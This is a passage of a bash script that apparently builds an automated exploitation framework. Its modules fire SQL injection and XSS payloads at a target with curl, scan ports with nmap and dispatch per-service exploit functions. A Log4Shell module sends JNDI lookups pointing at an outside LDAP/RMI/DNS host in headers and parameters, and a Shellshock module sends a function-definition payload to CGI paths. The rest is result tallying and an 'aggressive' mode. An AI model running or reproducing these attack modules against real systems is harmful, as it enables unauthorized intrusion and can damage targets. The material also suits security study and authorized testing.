    
    while IFS='|' read -r payload_type payload description risk_level; do
        if [[ "$payload_type" != "#"* && -n "$payload" ]]; then
            test_sql_payload "$target" "$payload" "$description" "$risk_level"
        fi
    done < "$payload_file"
}

test_sql_payload() {
    local target="$1"
    local payload="$2"
    local description="$3"
    local risk_level="$4"
    
    local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
    local test_url="$target?id=$encoded_payload"
    
    local response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
    
    if echo "$response" | grep -qi "mysql\|sql syntax\|oracle\|postgresql"; then
        echo "SQL injection found: $description"
        echo "Payload: $payload"
        echo "Risk: $risk_level"
        return 0
    fi
    
    return 1
}
EOF

    # XSS Module
    cat > "$MODULES_DIR/web/xss_module.sh" << 'EOF'
#!/bin/bash
# Automated XSS Module

execute_xss_test() {
    local target="$1"
    local payload_file="$2"
    
    while IFS='|' read -r payload_type payload description risk_level; do
        if [[ "$payload_type" != "#"* && -n "$payload" ]]; then
            test_xss_payload "$target" "$payload" "$description" "$risk_level"
        fi
    done < "$payload_file"
}

test_xss_payload() {
    local target="$1"
    local payload="$2"
    local description="$3"
    local risk_level="$4"
    
    local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g')
    local test_url="$target?q=$encoded_payload"
    
    local response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
    
    if echo "$response" | grep -q "alert\|<script\|onerror\|onload"; then
        echo "XSS vulnerability found: $description"
        echo "Payload: $payload"
        echo "Risk: $risk_level"
        return 0
    fi
    
    return 1
}
EOF

    chmod +x "$MODULES_DIR/web/"*.sh
}

create_network_exploitation_modules() {
    # Port scanning and service exploitation
    cat > "$MODULES_DIR/network/service_exploit.sh" << 'EOF'
#!/bin/bash
# Network Service Exploitation Module

exploit_network_services() {
    local target="$1"
    
    # Scan for open ports first
    local open_ports=$(nmap -p- --open -T4 "$target" 2>/dev/null | grep "^[0-9]" | cut -d'/' -f1)
    
    for port in $open_ports; do
        exploit_service_on_port "$target" "$port"
    done
}

exploit_service_on_port() {
    local target="$1"
    local port="$2"
    
    case "$port" in
        21) exploit_ftp "$target" "$port" ;;
        22) exploit_ssh "$target" "$port" ;;
        23) exploit_telnet "$target" "$port" ;;
        25) exploit_smtp "$target" "$port" ;;
        53) exploit_dns "$target" "$port" ;;
        80|8080) exploit_http "$target" "$port" ;;
        443|8443) exploit_https "$target" "$port" ;;
        445) exploit_smb "$target" "$port" ;;
        3389) exploit_rdp "$target" "$port" ;;
        *) echo "No specific exploit for port $port" ;;
    esac
}
EOF

    chmod +x "$MODULES_DIR/network/"*.sh
}

create_cve_exploitation_modules() {
    # Log4Shell module
    cat > "$MODULES_DIR/cve/log4shell.sh" << 'EOF'
#!/bin/bash
# Log4Shell (CVE-2021-44228) Exploitation Module

exploit_log4shell() {
    local target="$1"
    
    local payloads=(
        '${jndi:ldap://log4shell-test.com/a}'
        '${jndi:rmi://log4shell-test.com/a}'
        '${jndi:dns://log4shell-test.com/a}'
    )
    
    for payload in "${payloads[@]}"; do
        # Test in User-Agent
        curl -s -H "User-Agent: $payload" "$target" >/dev/null 2>&1
        
        # Test in X-Forwarded-For
        curl -s -H "X-Forwarded-For: $payload" "$target" >/dev/null 2>&1
        
        # Test in parameters
        curl -s "$target?search=$payload" >/dev/null 2>&1
        
        echo "Log4Shell payload sent: $payload"
    done
}
EOF

    # Shellshock module
    cat > "$MODULES_DIR/cve/shellshock.sh" << 'EOF'
#!/bin/bash
# Shellshock (CVE-2014-6271) Exploitation Module

exploit_shellshock() {
    local target="$1"
    
    local payload="() { :; }; echo 'SHELLSHOCK_TEST'"
    local cgi_paths=(
        "/cgi-bin/test.cgi"
        "/cgi-bin/status"
        "/test.cgi"
    )
    
    for path in "${cgi_paths[@]}"; do
        local response=$(curl -s -H "User-Agent: $payload" "$target$path" 2>/dev/null)
        
        if echo "$response" | grep -q "SHELLSHOCK_TEST"; then
            echo "Shellshock vulnerability confirmed at: $target$path"
            return 0
        fi
    done
    
    return 1
}
EOF

    chmod +x "$MODULES_DIR/cve/"*.sh
}

# ============================================================================
# Utility Functions
# ============================================================================

check_exploit_requirements() {
    local requirements="$1"
    
    IFS=',' read -ra REQUIRED <<< "$requirements"
    
    for req in "${REQUIRED[@]}"; do
        req=$(echo "$req" | xargs)  # Trim whitespace
        
        case "$req" in
            "curl"|"wget"|"nmap"|"sqlmap"|"hydra"|"metasploit"|"openssl")
                if ! command -v "$req" &> /dev/null; then
                    return 1
                fi
                ;;
            "impacket")
                if ! python3 -c "import impacket" 2>/dev/null; then
                    return 1
                fi
                ;;
            *)
                # Generic command check
                if ! command -v "$req" &> /dev/null; then
                    return 1
                fi
                ;;
        esac
    done
    
    return 0
}

analyze_exploitation_results() {
    local results_file="$1"
    local target="$2"
    
    print_info "Analyzing exploitation results..."
    
    local successful_exploits=$(find "$EXPLOIT_DB_DIR/results" -name "*_${target//[^a-zA-Z0-9]/_}_*.txt" -exec grep -l "Result: SUCCESS" {} \; 2>/dev/null | wc -l)
    local failed_exploits=$(find "$EXPLOIT_DB_DIR/results" -name "*_${target//[^a-zA-Z0-9]/_}_*.txt" -exec grep -l "Result: FAILED" {} \; 2>/dev/null | wc -l)
    local total_exploits=$((successful_exploits + failed_exploits))
    
    echo "" >> "$results_file"
    echo "EXPLOITATION SUMMARY" >> "$results_file"
    echo "===================" >> "$results_file"
    echo "Total Exploits Attempted: $total_exploits" >> "$results_file"
    echo "Successful Exploits: $successful_exploits" >> "$results_file"
    echo "Failed Exploits: $failed_exploits" >> "$results_file"
    
    if [[ $total_exploits -gt 0 ]]; then
        local success_rate=$(( (successful_exploits * 100) / total_exploits ))
        echo "Success Rate: $success_rate%" >> "$results_file"
    fi
    
    echo "" >> "$results_file"
    
    if [[ $successful_exploits -gt 0 ]]; then
        echo "SUCCESSFUL EXPLOITS:" >> "$results_file"
        echo "===================" >> "$results_file"
        
        find "$EXPLOIT_DB_DIR/results" -name "*_${target//[^a-zA-Z0-9]/_}_*.txt" -exec grep -l "Result: SUCCESS" {} \; 2>/dev/null | while read -r success_file; do
            local exploit_name=$(basename "$success_file" | cut -d'_' -f1)
            echo "- $exploit_name" >> "$results_file"
        done
        
        print_error "‚ö†Ô∏è  $successful_exploits successful exploits found!"
        print_warning "Target $target has been compromised through automated exploitation"
    else
        print_success "No successful exploits - target appears secure against automated attacks"
    fi
    
    print_info "Detailed results available in: $EXPLOIT_DB_DIR/results/"
}

# ============================================================================
# Integration with Scanning Results
# ============================================================================

integrate_with_scan_results() {
    local target="$1"
    local session_id="$2"
    
    print_info "Integrating with scan results for intelligent exploitation..."
    
    # Find recent scan results
    local scan_results_dir="$RESULTS_DIR/$session_id"
    
    if [[ ! -d "$scan_results_dir" ]]; then
        print_warning "No scan results found for session: $session_id"
        return 1
    fi
    
    # Combine all scan results
    local combined_results="$scan_results_dir/combined_scan_results.txt"
    
    echo "Combined Scan Results for Automated Exploitation" > "$combined_results"
    echo "Target: $target" >> "$combined_results"
    echo "Session: $session_id" >> "$combined_results"
    echo "Generated: $(date)" >> "$combined_results"
    echo "================================================" >> "$combined_results"
    echo "" >> "$combined_results"
    
    # Combine results from different scan types
    for result_file in "$scan_results_dir"/*.log "$scan_results_dir"/data/*.txt; do
        if [[ -f "$result_file" ]]; then
            echo "=== $(basename "$result_file") ===" >> "$combined_results"
            cat "$result_file" >> "$combined_results"
            echo "" >> "$combined_results"
        fi
    done
    
    print_success "Scan results combined: $combined_results"
    
    # Analyze for exploitation
    local exploit_plan_data=$(analyze_vulnerabilities_for_exploitation "$target" "$combined_results")
    
    if [[ -n "$exploit_plan_data" ]]; then
        # Execute automated exploits
        execute_automated_exploits "$target" "$exploit_plan_data"
    else
        print_warning "No exploitable vulnerabilities identified from scan results"
    fi
}

# ============================================================================
# Configuration and Management
# ============================================================================

configure_automated_exploitation() {
    clear_screen
    section_header "ü§ñ Automated Exploitation Configuration"
    
    echo -e "${YELLOW}Current Configuration:${NC}"
    echo -e "  Auto Exploit Level: $AUTO_EXPLOIT_LEVEL"
    echo -e "  Exploit Timeout: ${EXPLOIT_TIMEOUT}s"
    echo -e "  Max Concurrent Exploits: $MAX_CONCURRENT_EXPLOITS"
    echo -e "  Verify Exploits: $VERIFY_EXPLOITS"
    echo ""
    
    echo -e "${YELLOW}Configuration Options:${NC}"
    echo -e "${YELLOW}1.${NC} Set Auto Exploit Level (safe/moderate/aggressive)"
    echo -e "${YELLOW}2.${NC} Configure Exploit Timeout"
    echo -e "${YELLOW}3.${NC} Set Max Concurrent Exploits"
    echo -e "${YELLOW}4.${NC} Toggle Exploit Verification"
    echo -e "${YELLOW}5.${NC} View Exploit Database"
    echo -e "${YELLOW}6.${NC} Update Payload Templates"
    echo -e "${YELLOW}0.${NC} Back"
    echo ""
    echo -e "${BLUE}Select option: ${NC}"
    read -r config_choice
    
    case $config_choice in
        1) configure_exploit_level ;;
        2) configure_exploit_timeout ;;
        3) configure_max_concurrent ;;
        4) toggle_exploit_verification ;;
        5) view_exploit_database ;;
        6) update_payload_templates ;;
        0) return ;;
        *) print_error "Invalid option" ;;
    esac
}

configure_exploit_level() {
    echo -e "${YELLOW}Select auto exploit level:${NC}"
    echo -e "${YELLOW}1.${NC} Safe - Only low-risk exploits"
    echo -e "${YELLOW}2.${NC} Moderate - Low and medium-risk exploits"
    echo -e "${YELLOW}3.${NC} Aggressive - All exploits (HIGH RISK!)"
    echo ""
    echo -e "${BLUE}Select level: ${NC}"
    read -r level_choice
    
    case $level_choice in
        1) AUTO_EXPLOIT_LEVEL="safe" ;;
        2) AUTO_EXPLOIT_LEVEL="moderate" ;;
        3) 
            print_warning "‚ö†Ô∏è  Aggressive mode can cause system damage!"
            echo -e "${YELLOW}Are you sure? (yes/no): ${NC}"
            read -r confirm
            if [[ "$confirm" == "yes" ]]; then
                AUTO_EXPLOIT_LEVEL="aggressive"
            fi
            ;;
        *) print_error "Invalid choice" ;;
    esac
    
    print_success "Auto exploit level set to: $AUTO_EXPLOIT_LEVEL"
}

view_exploit_database() {
    clear_screen
    section_header "üìä Exploit Database Overview"
    
    if [[ -f "$EXPLOIT_DB_DIR/exploit_database.txt" ]]; then
        local total_exploits=$(grep -c "|" "$EXPLOIT_DB_DIR/exploit_database.txt")
        local critical_exploits=$(grep -c "CRITICAL" "$EXPLOIT_DB_DIR/exploit_database.txt")
        local high_exploits=$(grep -c "HIGH" "$EXPLOIT_DB_DIR/exploit_database.txt")
        local medium_exploits=$(grep -c "MEDIUM" "$EXPLOIT_DB_DIR/exploit_database.txt")
        local low_exploits=$(grep -c "LOW" "$EXPLOIT_DB_DIR/exploit_database.txt")
        
        echo -e "${GREEN}Exploit Database Statistics:${NC}"
        echo -e "  Total Exploits: $total_exploits"
        echo -e "  Critical Risk: $critical_exploits"
        echo -e "  High Risk: $high_exploits"
        echo -e "  Medium Risk: $medium_exploits"
        echo -e "  Low Risk: $low_exploits"
        echo ""
        
        echo -e "${YELLOW}Recent Exploits:${NC}"
        head -10 "$EXPLOIT_DB_DIR/exploit_database.txt" | grep -v "^#" | while IFS='|' read -r vuln_type cve_id exploit_module payload_type risk_level success_rate requirements; do
            echo -e "  $vuln_type ($risk_level) - Success: $success_rate%"
        done
    else
        print_error "Exploit database not found. Run initialization first."
    fi
    
    echo ""
    print_info "Press Enter to continue..."
    read -r
}
